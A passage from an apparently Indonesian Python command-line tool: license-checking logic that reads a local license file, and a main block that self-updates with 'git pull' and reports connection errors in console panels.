           prints(Panel(f'''{P2}[{M2}!{P2}] Opshhh Lisensi Yang Kamu Miliki Sudah Kedaluwarsa''',width=80,padding=(0,1),style=f"bold grey100"))
           self.removeLisensi() ; sleep(3) ; self.WhatsApp()

#----------------[CHEK LISENSI ]----------------#
   def Chekinn_(self):
       try:
           xcTeam = open("data/.LisensiLog.json","r").read()
       except FileNotFoundError as e : self.pasteLisen()
       self.clearTerminal()    ; self.ChekingLisensi()

#----------------[ SYSTEM CONTROL ]----------------#
if __name__=='__main__':
  try:
      os.system("git pull") ; Lisensi().Chekinn_()
  except requests.exceptions.ConnectionError as e:
      prints(Panel(f'{P2}Koneksi Kamu Buruk. Pastikan Terhubung Dengan INTERNET/WiFi Bro',width=80,padding=(0,1),style="bold grey100")) ; time.sleep(3.1) ; sys.exit()